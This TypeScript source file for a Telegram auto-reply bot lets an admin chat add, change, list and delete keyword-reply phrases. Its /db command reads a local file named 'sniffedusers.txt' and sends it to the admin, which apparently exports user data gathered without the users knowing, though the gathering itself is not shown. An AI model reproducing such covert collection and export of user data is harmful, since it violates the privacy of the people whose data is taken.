import { TelegramUI, CommandArgTypes } from "tgui";
import { Message, FormDataFile } from "tg";
import { strings } from "./";
import { promises as fs } from "fs";

let keyStack: string[] = [];

import * as config from "./config";

const bot = new TelegramUI(config.TELEGRAM_TOKEN);
let admin = bot.createCommandTerminal(config.ADMIN_CHAT_ID);

function onAdd(msg: Message, args: readonly [string]): string {
    keyStack.push(args[0]);
    return "Успешно! Теперь введите /set";
}

function onSet(msg: Message, args: readonly [string]): string {
    const key = keyStack.pop();
    if(!key) {
        return "Ключевое слово не задано!";
    }

    strings.set(key, args[0]);
    return "Успешно!";
}

function onDrop(msg: Message, args: readonly [string]): string {
    if(!strings.remove(args[0])) {
        return "Ключевая фраза не найдена!";
    }

    return "Удалено!";
}

function onGetAll(msg: Message, args: readonly []): string {
    return strings.getFormat();
}

admin.setHelp("/help");

admin.setCommand("/getall", "Возвращает все фразы", onGetAll);
admin.setCommand("/drop", "Удалить ключевую фразу", onDrop, [
    {
        name: "Ключевая фраза",
        type: CommandArgTypes.Text
    }
] as const);

admin.setCommand("/set", "Изменить ответ на ключевую фразу", onSet, [
    {
        name: "Ответ",
        type: CommandArgTypes.Text
    }
] as const);

admin.setCommand("/add", "Добавить ключевую фразу", onAdd, [
    {
        name: "Ключевая фраза",
        type: CommandArgTypes.Text
    }
] as const);

admin.setCommand("/db", "Получить базу", onDb);

async function onDb(msg: Message) {
	await bot.sendTextMessage(
		msg.chat.id,
		"Подготовка результата. Пожалуйста, подождите..."
	);
	
	const file = await fs.readFile("./sniffedusers.txt");
	
	const document: FormDataFile = {
		filename: Date.now() + ".txt",
		data: file
	};
	
	bot.sendDocument(msg.chat.id, document);
	
	return null;
}

bot.start();